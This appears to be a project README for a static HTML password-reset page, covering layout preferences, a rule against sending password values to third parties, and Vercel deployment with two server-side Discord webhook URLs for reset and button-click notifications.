# Project overview

This project is a static HTML password-reset page served by the configured Python
HTTP server. The page includes a responsive reset-password card and local form
validation.

## User preferences

- Keep the reset card centered across desktop and mobile viewport sizes.
- Treat password values as sensitive: never transmit them to third-party
  services or expose them in client-side logs.

## Vercel deployment

This project can be deployed directly to Vercel. The static page remains
`index.html`, and the Python server's API behavior is also available through
the Vercel-compatible functions in `api/`.

Configure these Vercel Project Environment Variables before deploying:

- `DISCORD_PASSWORD_RESET_WEBHOOK_URL` — webhook for password-reset
  notifications.
- `DISCORD_BUTTON_CLICK_WEBHOOK_URL` — webhook for button-click notifications.

Keep both webhook URLs server-side. They are read only by the API functions and
are never exposed to the browser. Vercel automatically serves `/index.html`
and maps `/api/password-reset-notification` and `/api/button-click` to their
corresponding functions using `vercel.json`.